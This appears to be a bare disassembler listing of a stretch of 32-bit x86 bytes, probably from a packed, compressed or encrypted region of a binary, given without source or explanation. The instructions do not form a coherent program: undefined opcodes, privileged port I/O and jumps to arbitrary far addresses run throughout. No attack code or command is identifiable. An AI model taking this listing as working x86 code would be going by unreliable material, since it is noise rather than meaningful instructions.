  40ff07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff08:	out    dx,al
  40ff09:	test   eax,0xb2ebaa4e
  40ff0e:	pusha  
  40ff0f:	daa    
  40ff10:	pop    esi
  40ff11:	mov    ebp,0x58cabd64
  40ff16:	mov    eax,ds:0xe5a76073
  40ff1b:	pop    edi
  40ff1c:	stos   BYTE PTR es:[edi],al
  40ff1d:	fnstcw WORD PTR [ebx+0x3]
  40ff20:	push   edi
  40ff21:	test   ecx,ecx
  40ff23:	pushf  
  40ff24:	inc    esi
  40ff25:	mov    dl,0x77
  40ff27:	dec    ebx
  40ff28:	add    al,0xd2
  40ff2a:	imul   esi,DWORD PTR [edi+0x7a106bbe],0x8
  40ff31:	add    ebp,DWORD PTR [eax+0x32]
  40ff34:	sti    
  40ff35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff36:	add    dh,BYTE PTR [ebx+0x7716a1d1]
  40ff3c:	xchg   edx,eax
  40ff3d:	xor    al,ah
  40ff3f:	xor    eax,0xcb69733c
  40ff44:	sub    al,0x40
  40ff46:	inc    edi
  40ff47:	sbb    DWORD PTR [edx-0x30],eax
  40ff4a:	jb     0x40ff94
  40ff4c:	hlt    
  40ff4d:	xlat   BYTE PTR ds:[ebx]
  40ff4e:	push   ebp
  40ff4f:	xor    BYTE PTR [ecx],bh
  40ff51:	cmp    DWORD PTR [ebx],0x86cf1cc9
  40ff57:	ja     0x40ffce
  40ff59:	adc    al,0x5f
  40ff5b:	je     0x40fef5
  40ff5d:	rcr    DWORD PTR [ebx+0x23],cl
  40ff60:	mov    bl,0xb3
  40ff62:	xor    ch,dl
  40ff64:	add    al,0x2c
  40ff66:	sbb    DWORD PTR [edi-0x67],edi
  40ff69:	sub    BYTE PTR [ecx-0x7060d6cc],0x17
  40ff70:	je     0x40ff22
  40ff72:	loope  0x40ffcc
  40ff74:	fwait
  40ff75:	jecxz  0x40ff8b
  40ff77:	inc    edx
  40ff78:	cmp    al,0x6c
  40ff7a:	sub    eax,DWORD PTR [ebp+0x75]
  40ff7d:	(bad)  
  40ff7e:	dec    ebp
  40ff7f:	or     al,0x3a
  40ff81:	push   esp
  40ff82:	jle    0x40ff6c
  40ff84:	out    dx,eax
  40ff85:	mov    ds:0xcbea3b55,al
  40ff8a:	and    DWORD PTR [eax+edx*2+0x5],0x3a
  40ff8f:	std    
  40ff90:	popa   
  40ff91:	fcom   DWORD PTR [eax+ecx*8+0x5]
  40ff95:	pop    ds
  40ff96:	push   ss
  40ff97:	push   cs
  40ff98:	push   esi
  40ff99:	ret    0xdea4
  40ff9c:	cmp    eax,0xe14f6c7
  40ffa1:	xor    al,0x85
  40ffa3:	lods   al,BYTE PTR ds:[esi]
  40ffa4:	or     eax,0x39052913
  40ffa9:	loope  0x40ff8a
  40ffab:	jae    0x410029
  40ffad:	lds    eax,FWORD PTR [esi]
  40ffaf:	adc    bl,BYTE PTR [ebx]
  40ffb1:	xlat   BYTE PTR ds:[ebx]
  40ffb2:	xchg   ecx,eax
  40ffb3:	sub    eax,0x3228e930
  40ffb8:	inc    ecx
  40ffb9:	sub    ah,ch
  40ffbb:	aam    0x85
  40ffbd:	cdq    
  40ffbe:	push   edx
  40ffbf:	retf   0x95dd
  40ffc2:	pop    ss
  40ffc3:	push   ecx
  40ffc4:	scas   eax,DWORD PTR es:[edi]
  40ffc5:	dec    ebx
  40ffc6:	add    DWORD PTR [edi],0xb56da822
  40ffcc:	jmp    0x40fffc
  40ffce:	xchg   edx,eax
  40ffcf:	(bad)  
  40ffd0:	(bad)  
  40ffd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffd2:	mov    esp,0xc385ca89
  40ffd7:	imul   esp
  40ffd9:	cmp    ah,dl
  40ffdb:	dec    esi
  40ffdc:	cmp    dh,dl
  40ffde:	adc    DWORD PTR [eax+0x26bc672c],edx
  40ffe4:	sbb    BYTE PTR [ebp+0x15c30da6],dh
  40ffea:	pushf  
  40ffeb:	fnstsw WORD PTR [edi+ebx*2-0x2f07e56]
  40fff2:	test   BYTE PTR ds:0x7ed46412,bl
  40fff8:	xlat   BYTE PTR ds:[ebx]
  40fff9:	xchg   ebx,eax
  40fffa:	jp     0x41005d
  40fffc:	pop    edx
  40fffd:	xchg   ebp,eax
  40fffe:	sbb    al,0x0
  410000:	adc    BYTE PTR [esi],0x73
  410003:	in     eax,dx
  410004:	sti    
  410005:	cmp    DWORD PTR [esi+0x68],esi
  410008:	iret   
  410009:	ficomp WORD PTR [ebp+0x4b]
  41000c:	adc    ch,al
  41000e:	pop    esp
  41000f:	aam    0x30
  410011:	fidiv  DWORD PTR [edi-0x3fc04ff]
  410017:	and    eax,0xb5187007
  41001c:	sub    eax,0xf85ca61
  410021:	call   0x19b7:0x75a0bb46
  410028:	ror    BYTE PTR ds:0xecfcdded,0xfb
  41002f:	test   dl,0x37
  410032:	fld    QWORD PTR [edx-0x7bfcdfd0]
  410038:	cs sub eax,0xd0b2b069
  41003e:	shl    BYTE PTR [edi-0x15932fe5],1
  410044:	push   ebx
  410045:	adc    esi,ecx
  410047:	mov    edi,0x51bfcd8
  41004c:	mov    ds:0x349992bc,al
  410051:	jmp    0x82c79a22
  410056:	adc    edi,DWORD PTR [ebx-0x67]
  410059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41005a:	mov    esp,0xc96dcb7
  41005f:	inc    ecx
  410060:	sbb    al,0x86
  410062:	xlat   BYTE PTR ds:[ebx]
  410063:	xor    al,bl
  410065:	shl    DWORD PTR ds:0x4c8595eb,0x73
  41006c:	cmp    DWORD PTR [edi-0x56],eax
  41006f:	fmul   QWORD PTR [esi]
  410071:	add    eax,0x22f63fe2
  410076:	mov    edi,0xf25105a1
  41007b:	cmp    ah,BYTE PTR [eax-0x24]
  41007e:	dec    eax
  41007f:	and    DWORD PTR [ebx-0x19a3b71e],0x4c
  410086:	add    al,0xf1
  410088:	cs pop edx
  41008a:	pop    eax
  41008b:	fnsetpm(287 only) 
  41008d:	out    0x57,eax
  41008f:	mov    bh,0x41
  410091:	shl    BYTE PTR [esp+eiz*2+0x50fefe6a],0x82
  410099:	pop    ecx
  41009a:	std    
  41009b:	inc    esi
  41009c:	repz pop ecx
  41009e:	fs out 0x2c,eax
  4100a1:	inc    ebp
  4100a2:	js     0xbf664963
  4100a8:	or     bl,BYTE PTR [edx+0x1b]
  4100ab:	dec    ebx
  4100ac:	xor    BYTE PTR [edx],0x2f
  4100af:	mov    ch,0xf8
  4100b1:	mov    eax,0xb88ff361
  4100b6:	sub    edi,DWORD PTR [edi]
  4100b8:	ja     0x410120
  4100ba:	add    esp,eax
  4100bc:	jecxz  0x41004e
  4100be:	adc    DWORD PTR ds:0x5023a29c,edi
  4100c4:	sbb    bl,BYTE PTR [edx]
  4100c6:	pop    ecx
  4100c7:	sar    BYTE PTR [edx],0x6b
  4100ca:	pop    ebx
  4100cb:	fisttp QWORD PTR [ecx+edi*1]
  4100ce:	in     al,dx
  4100cf:	mov    ecx,0x93033cc1
  4100d4:	cmp    BYTE PTR [edx],al
  4100d6:	sbb    ch,BYTE PTR [eax+esi*4]
  4100d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100da:	pop    ebp
  4100db:	and    BYTE PTR [edx-0x2e],ah
  4100de:	push   ds
  4100df:	jbe    0x410106
  4100e1:	cmp    ebx,DWORD PTR [eax+0x7f9ebcf1]
  4100e7:	pandn  mm4,QWORD PTR [esi+0x6c4ddfe0]
  4100ee:	sbb    eax,DWORD PTR [ecx]
  4100f0:	cmc    
  4100f1:	aas    
  4100f2:	sub    bl,ah
  4100f4:	test   al,0xe9
  4100f6:	adc    eax,DWORD PTR [edx+esi*4]
  4100f9:	push   esp
  4100fa:	mov    ?,WORD PTR [ebx+0x5fee6761]
  410100:	inc    eax
  410101:	dec    edx
  410102:	push   ebp
  410103:	sub    eax,0xbd9180ce
  410108:	adc    al,0x75
  41010a:	lods   eax,DWORD PTR ds:[esi]
  41010b:	repz into 
  41010d:	test   eax,0xf7bd223e
  410112:	xchg   esi,eax
  410113:	aam    0xf0
  410115:	mov    edx,0x8cab3308
  41011a:	pop    ebp
  41011b:	out    0x3,eax
  41011d:	xchg   dh,ch
  41011f:	sbb    ah,BYTE PTR es:[ebx+ebx*1+0x4c]
  410124:	iret   
  410125:	xchg   ebp,eax
  410126:	sbb    eax,0xbe3fa665
  41012b:	push   ss
  41012c:	xchg   ecx,eax
  41012d:	iret   
  41012e:	jnp    0x4101ac
  410130:	sub    eax,0x8e397df7
  410135:	sub    ebp,DWORD PTR [ecx]
  410137:	xchg   DWORD PTR [edi-0x2b],ecx
  41013a:	pop    ss
  41013b:	sbb    BYTE PTR [ecx+ebx*2],dl
  41013e:	repnz dec esi
  410140:	xchg   edi,eax
  410141:	std    
  410142:	inc    edx
  410143:	jmp    0x5b48fbc7
  410148:	push   esp
  410149:	push   ss
  41014a:	jmp    0x3381:0x3dc5a734
  410151:	loope  0x4101a4
  410153:	xchg   ebx,eax
  410154:	jmp    0x41013f
  410156:	push   ss
  410157:	gs sub eax,0x7b03219e
  41015d:	jnp    0x410133
  41015f:	repz sub cl,BYTE PTR [ebx+0x25]
  410163:	aam    0xf8
  410165:	push   esi
  410166:	data16 test ah,bh
  410169:	pextrw esi,(bad),0xc5
  41016b:	aaa    
  41016c:	call   0xfbbc1ac1
  410171:	ins    BYTE PTR es:[edi],dx
  410172:	fbld   TBYTE PTR [esi+0xe1ad329]
  410178:	inc    ebp
  410179:	cmp    eax,0xf5f6c116
  41017e:	sti    
  41017f:	jns    0x4101e6
  410181:	adc    dl,BYTE PTR [edi-0x7c]
  410184:	cmp    eax,DWORD PTR [eax-0xc]
  410187:	pop    ebp
  410188:	lds    esp,FWORD PTR [ebp+0x2a7b587]
  41018e:	xlat   BYTE PTR ds:[ebx]
  41018f:	xchg   esp,eax
  410190:	pushf  
  410191:	mov    fs,WORD PTR [edx-0x63a19631]
  410197:	out    0x9,al
  410199:	or     al,BYTE PTR [ebx-0x4c]
  41019c:	pop    edx
  41019d:	sub    edx,DWORD PTR [edi+0x67]
  4101a0:	or     ecx,edx
  4101a2:	hlt    
  4101a3:	addr16 xchg edi,eax
  4101a5:	ror    cl,0x44
  4101a8:	and    esp,edx
  4101aa:	(bad)  
  4101ac:	xor    edx,DWORD PTR [eax]
  4101ae:	jbe    0x4101bc
  4101b0:	icebp  
  4101b1:	ins    DWORD PTR es:[edi],dx
  4101b2:	jmp    0xf856e757
  4101b7:	xor    eax,ebp
  4101b9:	in     eax,0xc6
  4101bb:	ins    BYTE PTR es:[edi],dx
  4101bc:	mov    bl,0xdd
  4101be:	fstp   QWORD PTR [esi]
  4101c0:	nop
  4101c1:	pop    ebx
  4101c2:	shl    ch,1
  4101c4:	mov    edx,0xb3349c43
  4101c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ca:	mov    ebp,0x1cfba860
  4101cf:	stos   BYTE PTR es:[edi],al
  4101d0:	das    
  4101d1:	dec    ebx
  4101d2:	jge    0x41021a
  4101d4:	call   0xadda9533
  4101d9:	push   ebp
  4101da:	shl    DWORD PTR [ecx+edx*4+0x34],0xca
  4101df:	push   ss
  4101e0:	push   ds
  4101e1:	imul   edx,ebx,0xffffffce
  4101e4:	xchg   esi,eax
  4101e5:	mov    ds:0x6c483b12,eax
  4101ea:	es lock push edi
  4101ed:	xlat   BYTE PTR ds:[ebx]
  4101ee:	inc    eax
  4101ef:	popf   
  4101f0:	dec    ebx
  4101f1:	out    dx,al
  4101f2:	lock fdiv DWORD PTR [edi]
  4101f5:	in     al,0x70
  4101f7:	mov    esp,0x549ba402
  4101fc:	mov    cl,dh
  4101fe:	iret   
  4101ff:	in     al,0x8a
  410201:	aad    0x53
  410203:	(bad)  
  410204:	in     eax,dx
  410205:	mov    ds:0xbb84aad6,eax
  41020a:	aas    
  41020b:	shl    DWORD PTR [ebx],1
  41020d:	or     BYTE PTR [ecx-0x5a18d64a],al
  410213:	sbb    DWORD PTR [eax-0x70],0x4e
  410217:	mov    ah,0xfa
  410219:	pop    ss
  41021a:	stos   BYTE PTR es:[edi],al
  41021b:	lods   eax,DWORD PTR ds:[esi]
  41021c:	jae    0x410266
  41021e:	xchg   edx,eax
  41021f:	js     0x41029a
  410221:	(bad)  
  410222:	je     0x410239
  410224:	xchg   BYTE PTR [ecx-0x22],ah
  410227:	(bad)  
  410228:	in     al,0xb2
  41022a:	cwde   
  41022b:	mov    bl,0x99
  41022d:	fnclex 
  41022f:	sub    al,0x58
  410231:	push   edi
  410232:	add    BYTE PTR ds:0xc77044fd,0xca
  410239:	fs adc al,0x8d
  41023c:	jecxz  0x410286
  41023e:	add    BYTE PTR [eax-0x2a],bh
  410241:	or     eax,0x682efe0d
  410246:	jnp    0x4101cb
  410248:	mov    eax,ds:0xa1f841ae
  41024d:	and    DWORD PTR [edi+0x353cb2bd],0xf35fd936
  410257:	sub    DWORD PTR [ecx+eiz*4+0x6a695ef7],0x4efd6994
  410262:	sub    ebp,DWORD PTR [edi-0x73b8b3c1]
  410268:	mov    gs,WORD PTR [edx+0x5f99a802]
  41026e:	arpl   si,dx
  410270:	aas    
  410271:	mov    al,ds:0x8e5a863d
  410276:	leavew 
  410278:	mov    al,ds:0x999fef69
  41027d:	xchg   ecx,eax
  41027e:	fnstcw WORD PTR [esi]
  410280:	sub    esp,esi
  410282:	pop    edx
  410283:	xlat   BYTE PTR ds:[ebx]
  410284:	mov    cs,WORD PTR [eax-0x33da7c96]
  41028a:	sti    
  41028b:	push   esi
  41028c:	test   BYTE PTR [ecx+edx*1-0x23],al
  410290:	jo     0x4102c0
  410292:	push   ss
  410293:	push   es
  410294:	push   ebp
  410295:	vpunpckldq xmm0,xmm5,XMMWORD PTR [edi+0x2719baee]
  41029d:	cld    
  41029e:	(bad)  
  41029f:	pop    edi
  4102a0:	stos   BYTE PTR es:[edi],al
  4102a1:	out    dx,al
  4102a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a3:	in     eax,dx
  4102a4:	enter  0xe015,0xcf
  4102a8:	and    eax,0xf989f010
  4102ad:	cmp    ecx,DWORD PTR [edi]
  4102af:	xchg   ecx,eax
  4102b0:	push   0x24
  4102b2:	pop    ebp
  4102b3:	add    eax,edx
  4102b5:	bound  edi,QWORD PTR [eax]
  4102b7:	or     BYTE PTR [esi+edx*2],ch
  4102ba:	ficom  WORD PTR [ecx+0x7fce5803]
  4102c0:	sbb    esi,DWORD PTR [edx+0x67]
  4102c3:	pop    ebx
  4102c4:	fs xor ecx,DWORD PTR ss:[edx]
  4102c8:	adc    DWORD PTR [edx],esp
  4102ca:	fdivr  DWORD PTR [ebp+edi*8+0x627c64a0]
  4102d1:	or     bh,BYTE PTR [esi+0xd]
  4102d4:	xchg   ebp,eax
  4102d5:	sti    
  4102d6:	mov    ch,0x28
  4102d8:	xchg   DWORD PTR ds:0xc37dc644,ecx
  4102de:	iret   
  4102df:	int    0x40
  4102e1:	inc    edi
  4102e2:	mov    DWORD PTR [ecx+0x29],esp
  4102e5:	mov    esi,0x9e5d7149
  4102ea:	and    eax,0x42648ea3
  4102ef:	adc    DWORD PTR [edx+0x1946cf52],edi
  4102f5:	or     edi,DWORD PTR ss:[eax]
  4102f8:	or     BYTE PTR [edx],bh
  4102fa:	aaa    
  4102fb:	sbb    DWORD PTR [ebp-0x5f],0xa
  4102ff:	xchg   edi,ebp
  410301:	adc    eax,ebx
  410303:	in     eax,0x2f
  410305:	in     al,0x58
  410307:	into   
  410308:	ja     0x410363
  41030a:	sub    al,0xe
  41030c:	div    dl
  41030e:	jnp    0x410291
  410310:	sub    ebp,DWORD PTR [ebx+0xe783002]
  410316:	sub    DWORD PTR [esp+edi*1],edx
  410319:	and    eax,0x17c830e5
  41031e:	icebp  
  41031f:	sti    
  410320:	mov    ds:0xb7d8be28,eax
  410325:	test   al,0x5e
  410327:	popa   
  410328:	loopne 0x410390
  41032a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41032b:	mov    ebx,0x3833aa53
  410330:	xor    BYTE PTR [ecx+0x6888586],bl
  410336:	in     al,0xcf
  410338:	out    0xf0,eax
  41033a:	inc    eax
  41033b:	int    0x24
  41033d:	les    esp,FWORD PTR [edx-0x64]
  410340:	ret    0x100d
  410343:	mov    bh,0x69
  410345:	jle    0x41034a
  410347:	iret   
  410348:	inc    ecx
  410349:	mov    dl,0xe0
  41034b:	and    al,0x9d
  41034d:	nop
  41034e:	pop    edx
  41034f:	push   eax
  410350:	fsub   QWORD PTR [edx+0xc]
  410353:	mov    eax,ds:0x85c6351d
  410358:	rol    ch,1
  41035a:	inc    edx
  41035b:	push   edi
  41035c:	(bad)  
  41035f:	add    dh,BYTE PTR [esi]
  410361:	aas    
  410362:	dec    ecx
  410363:	jno    0x410357
  410365:	fwait
  410366:	lods   eax,DWORD PTR ds:[esi]
  410367:	int    0x69
  410369:	mov    dl,0x26
  41036b:	les    ebp,FWORD PTR [ecx+0x5b45a85e]
  410371:	push   esi
  410372:	test   eax,0xe32f5c78
  410377:	jno    0x4103f4
  410379:	pop    eax
  41037a:	mov    ds:0x4fb6c0b7,al
  41037f:	ds pushf 
  410381:	test   cl,0x7f
  410384:	call   0x65da:0xdc481a59
  41038b:	ins    BYTE PTR es:[edi],dx
  41038c:	repz inc edi
  41038e:	(bad)  
  41038f:	js     0x4103d8
  410391:	push   eax
  410392:	add    bh,0x7e
  410395:	repz call 0xa18b:0x2f0ad1d
  41039d:	mov    ah,0xb3
  41039f:	out    dx,eax
  4103a0:	gs add cl,dh
  4103a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103a4:	sub    al,0xe9
  4103a6:	loope  0x4103f5
  4103a8:	repz push esp
  4103aa:	std    
  4103ab:	clc    
  4103ac:	mov    es,WORD PTR [ebp+0x4ea9beed]
  4103b2:	cmp    eax,0xd23608c7
  4103b7:	sub    eax,DWORD PTR [ebx+esi*4]
  4103ba:	je     0x4103d5
  4103bc:	push   ebx
  4103bd:	aaa    
  4103be:	push   cs
  4103bf:	imul   ecx,DWORD PTR [eax-0x33],0xffffffb5
  4103c3:	frndint 
  4103c5:	mov    es,ebx
  4103c7:	fidivr DWORD PTR [ebx-0x54]
  4103ca:	push   esi
  4103cc:	inc    esp
  4103cd:	scas   eax,DWORD PTR es:[edi]
  4103ce:	pop    ds
  4103cf:	ss es sahf 
  4103d2:	mov    ebp,0xfdbcd1c6
  4103d7:	add    esp,DWORD PTR [ecx+0x1a2369aa]
  4103dd:	outs   dx,DWORD PTR ds:[esi]
  4103de:	pop    ss
  4103df:	shl    BYTE PTR [edi+eax*4+0x3d],0xe8
  4103e4:	icebp  
  4103e5:	mov    al,ds:0x122a8659
  4103ea:	out    dx,al
  4103eb:	pop    DWORD PTR [eax+0x7318f6]
  4103f1:	loop   0x41044d
  4103f3:	inc    ebx
  4103f4:	fiadd  DWORD PTR [esi-0x66]
  4103f7:	xchg   BYTE PTR [esi+ecx*8-0x608811a3],al
  4103fe:	imul   edi,DWORD PTR [ebx+0x221d5b35],0xffffffa2
  410405:	mov    ebp,esp
  410407:	sub    DWORD PTR [eax+0x6],0x0
  41040b:	out    0x11,eax
  41040d:	shr    ebp,cl
  41040f:	gs adc ch,dl
  410412:	pop    ds
  410413:	pushw  ds
  410415:	jo     0x410482
  410417:	nop
  410418:	jmp    DWORD PTR [edi+0x25]
  41041b:	addr16 std 
  41041d:	lea    esi,[edx+0x1e]
  410420:	shl    ecx,1
  410422:	lods   eax,DWORD PTR ds:[esi]
  410423:	xor    dl,BYTE PTR [esi]
  410425:	pcmpgtb mm6,QWORD PTR [edi]
  410428:	push   ebx
  410429:	mov    al,0x46
  41042b:	mov    dl,0xc2
  41042d:	pop    ebx
  41042e:	push   eax
  41042f:	jmp    0x54ae:0x15153a08
  410436:	inc    eax
  410437:	test   eax,0xf0ba9f9c
  41043c:	push   0x60
  41043e:	(bad)  
  41043f:	fiadd  WORD PTR [edx-0x9819964]
  410445:	adc    BYTE PTR [ebx+0x68fe4dfe],ah
  41044b:	addr16 add al,0x2
  41044e:	(bad)  
  41044f:	lods   eax,DWORD PTR ds:[esi]
  410450:	nop
  410451:	ror    ah,0x28
  410454:	(bad)  
  410455:	ficomp DWORD PTR [edx-0x6f16deef]
  41045b:	into   
  41045c:	jmp    0x4104dc
  41045e:	sub    eax,0xb32a2ef5
  410463:	loop   0x410496
  410465:	fsub   DWORD PTR [ebx]
  410467:	sub    DWORD PTR [eax-0x1ca41044],ebx
  41046d:	popa   
  41046e:	mov    gs,WORD PTR [ebx+0x7a]
  410471:	bnd ret 
  410473:	add    al,0xbd
  410475:	(bad)  [ebp-0x4e]
  410478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410479:	add    eax,0xe5c2602f
  41047e:	dec    esp
  41047f:	fsub   DWORD PTR [eax-0x7ba32d6a]
  410485:	push   0x5e9fdbef
  41048a:	gs popf 
  41048c:	adc    dh,al
  41048e:	jns    0x410474
  410490:	or     eax,0x496fe030
  410495:	mov    esp,0x7d617720
  41049a:	adc    eax,0x6156d548
  41049f:	bound  ebp,QWORD PTR [edi-0xb]
  4104a2:	cmp    eax,DWORD PTR [eax-0x5c]
  4104a5:	pop    ecx
  4104a6:	in     eax,dx
  4104a7:	(bad)  
  4104a9:	add    ebx,DWORD PTR [ecx+0x2a634b9f]
  4104af:	and    ebp,esp
  4104b1:	pop    edi
  4104b2:	scas   eax,DWORD PTR es:[edi]
  4104b3:	(bad)  
  4104b4:	das    
  4104b5:	pop    ebp
  4104b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104b7:	mov    ds:0x5919c104,eax
  4104bc:	rcr    DWORD PTR ds:0x8f8df334,1
  4104c2:	repnz inc edi
  4104c4:	or     DWORD PTR ds:0x60935bf3,edi
  4104ca:	jg     0x4104f2
  4104cc:	mul    ebp
  4104ce:	repz out dx,eax
  4104d0:	inc    BYTE PTR [ebp+esi*1-0x35]
  4104d4:	sub    eax,0x6e6892d1
  4104d9:	xchg   ebp,eax
  4104da:	or     cl,BYTE PTR [eax]
  4104dc:	test   dx,dx
  4104df:	out    dx,eax
  4104e0:	mov    ds:0xff692a9,eax
  4104e5:	stos   DWORD PTR es:[edi],eax
  4104e6:	xchg   esi,eax
  4104e7:	test   eax,0x1bf53e50
  4104ec:	lock jp 0x410491
  4104ef:	jge    0x4104cc
  4104f1:	xchg   ecx,eax
  4104f2:	mov    edx,0xc8c1f37b
  4104f7:	repz adc ecx,DWORD PTR [ebp+0x707cfea]
  4104fe:	(bad)  
  4104ff:	pop    edi
  410500:	sub    DWORD PTR [edi+0x6c],0x816076c7
  410507:	and    DWORD PTR [ecx+0x14],eax
  41050a:	int    0xdc
  41050c:	fisub  WORD PTR [eax-0x8]
  41050f:	add    dl,BYTE PTR [edx]
  410511:	adc    dl,BYTE PTR [edx+0x15]
  410514:	fmul   st,st(3)
  410516:	fldcw  WORD PTR ds:0x727adf7b
  41051c:	test   eax,0x14f1c1f7
  410521:	cmc    
  410522:	(bad)  
  410523:	arpl   WORD PTR [ebx],ax
  410525:	jno    0x41051c
  410527:	ins    BYTE PTR es:[edi],dx
  410528:	or     DWORD PTR ds:0x838ed2a8,edx
  41052e:	jge    0x41052e
  410530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410531:	popa   
  410532:	inc    ecx
  410533:	xor    dl,BYTE PTR [edx]
  410535:	sbb    ebp,DWORD PTR [esp+esi*8-0x1c]
  410539:	sbb    al,0x94
  41053b:	xor    eax,0x5634b864
  410540:	cmp    ah,BYTE PTR [edx+0x24]
  410543:	rol    DWORD PTR [ecx+edi*4],cl
  410546:	mov    ebx,0xa877e1c4
  41054b:	push   0x6e34c437
  410550:	addr16 dec esp
  410552:	push   ebp
  410553:	inc    ecx
  410554:	pop    eax
  410555:	push   esi
  410556:	mov    WORD PTR [edi],ss
  410558:	pop    esi
  410559:	xchg   edx,eax
  41055a:	ficomp WORD PTR [ebp+0x5b]
  41055d:	adc    BYTE PTR [ecx-0x6e02268b],bh
  410563:	test   BYTE PTR [ebp-0x13],al
  410566:	std    
  410567:	(bad)  
  410568:	fsub   QWORD PTR [ecx]
  41056a:	outs   dx,DWORD PTR ds:[esi]
  41056b:	je     0x41055c
  41056d:	out    0x22,al
  41056f:	(bad)  
  410570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410572:	pushf  
  410573:	retf   
  410574:	rol    ebx,1
  410576:	nop
  410577:	(bad)  
  410578:	in     eax,0xf9
  41057a:	fild   DWORD PTR [ecx]
  41057c:	je     0x4105b4
  41057e:	or     DWORD PTR [edx],eax
  410580:	cmp    DWORD PTR [esi+0x4f],edi
  410583:	pop    es
  410584:	in     al,dx
  410585:	lods   eax,DWORD PTR ds:[esi]
  410586:	arpl   dx,dx
  410588:	dec    eax
  410589:	dec    edx
  41058a:	dec    ebp
  41058b:	lahf   
  41058c:	rcr    DWORD PTR [ebp-0x4bad072a],0x68
  410593:	data16 int3 
  410595:	jbe    0x410566
  410597:	shl    DWORD PTR [ecx-0x5b],0xfe
  41059b:	loop   0x410529
  41059d:	pushf  
  41059e:	inc    edx
  41059f:	jmp    0x4105e0
  4105a1:	repz icebp 
  4105a3:	fcmovnu st,st(6)
  4105a5:	xor    ah,BYTE PTR [ebx]
  4105a7:	enter  0x4d94,0xbd
  4105ab:	xchg   esi,eax
  4105ac:	test   eax,0x6cfb394
  4105b1:	(bad)
  4105b5:	sub    al,0xbc
  4105b7:	ret    
  4105b8:	push   eax
  4105b9:	test   BYTE PTR [edx],bh
  4105bb:	ja     0x4105ac
  4105bd:	cmc    
  4105be:	lods   al,BYTE PTR ds:[esi]
  4105bf:	xchg   edi,eax
  4105c0:	mov    fs,WORD PTR [edx+0x36cb9f0c]
  4105c6:	cld    
  4105c7:	lds    esi,FWORD PTR [ebp+0x33]
  4105ca:	pop    ss
  4105cb:	xchg   ecx,eax
  4105cc:	fsubr  st,st(0)
  4105ce:	jnp    0x4105dd
  4105d0:	mov    eax,ds:0xce3aef01
  4105d5:	div    DWORD PTR [ebp+0x34]
  4105d8:	les    edx,FWORD PTR [ebx+edi*4-0x62976906]
  4105df:	pop    edi
  4105e0:	mov    ds:0x356ee1ed,eax
  4105e5:	(bad)  
  4105e6:	or     dl,BYTE PTR [esi-0xc]
  4105e9:	popf   
  4105ea:	(bad)  
  4105eb:	cwde   
  4105ec:	jmp    esp
  4105ee:	xchg   ebx,eax
  4105ef:	pop    ebx
  4105f0:	adc    DWORD PTR [ecx+0x60],ebx
  4105f3:	imul   ecx,DWORD PTR [ebx+0x52],0x78
  4105f7:	sub    eax,ebx
  4105f9:	mov    ah,0xf0
  4105fb:	int    0x85
  4105fd:	or     eax,0x7fa1b5a0
  410602:	jecxz  0x4105a8
  410604:	xor    cl,BYTE PTR [edx]
  410606:	push   ss
  410607:	xchg   edx,eax
  410608:	push   eax
  410609:	cmc    
  41060a:	lods   al,BYTE PTR ds:[esi]
  41060b:	cli    
  41060c:	jge    0x410626
  41060e:	sbb    eax,DWORD PTR [ebx+ebp*4+0x6c]
  410612:	jg     0x410610
  410614:	nop
  410615:	dec    ebx
  410616:	in     al,0x52
  410618:	pushf  
  410619:	push   ss
  41061a:	jp     0x4105d0
  41061c:	sub    ch,bh
  41061e:	add    al,0xbd
  410620:	jp     0x4105d0
  410622:	pop    ebp
  410623:	dec    esi
  410624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410625:	fsubr  QWORD PTR [edx]
  410627:	lock nop
  410629:	push   0x902f3a92
  41062e:	mov    ecx,0x1be2635f
  410633:	repz adc BYTE PTR [edi+0x78],ah
  410637:	dec    edx
  410638:	dec    edx
  410639:	mov    ds:0xc41498f2,al
  41063e:	sar    BYTE PTR [esp+edx*1],1
  410641:	xlat   BYTE PTR ds:[ebx]
  410642:	das    
  410643:	addr16 jne 0x410665
  410646:	outs   dx,DWORD PTR ds:[esi]
  410647:	test   eax,0x806f5ab9
  41064c:	out    0x7c,al
  41064e:	xchg   esp,eax
  41064f:	cmp    ebx,DWORD PTR ds:0xee259683
  410655:	sbb    al,0xd1
  410657:	daa    
  410658:	xor    eax,0x932f6e63
  41065d:	pop    eax
  41065e:	xchg   DWORD PTR ds:0x2485f04,ebx
  410664:	inc    ebx
  410665:	sbb    DWORD PTR [edi-0x4d4e1e83],esi
  41066b:	dec    ebp
  41066c:	cmp    BYTE PTR [eax-0x43],ah
  41066f:	sub    al,0xf9
  410671:	xchg   esi,eax
  410672:	pop    esi
  410673:	mov    al,ds:0x70352175
  410678:	aam    0x9f
  41067a:	or     DWORD PTR [edx+ecx*4-0x6c5f360a],ebp
  410681:	shl    DWORD PTR [esi-0x74],cl
  410684:	imul   edx,esp,0xffffff8c
  410687:	es jl  0x41062e
  41068a:	sbb    ch,BYTE PTR [eax]
  41068c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41068d:	mov    al,ds:0xe2cdf4a3
  410692:	mov    esi,0x659b56e7
  410697:	adc    BYTE PTR [edx+0x1e8099eb],dl
  41069d:	lock (bad) 
  41069f:	or     DWORD PTR [ebp+0x68],edx
  4106a2:	push   es
  4106a3:	and    ebx,esp
  4106a5:	sahf   
  4106a6:	sbb    eax,DWORD PTR [ebx+eiz*2+0x48edff69]
  4106ad:	in     eax,dx
  4106ae:	out    dx,eax
  4106af:	shl    BYTE PTR [edx+eiz*2],cl
  4106b2:	mov    edx,0xdc62bd2a
  4106b7:	add    ch,dh
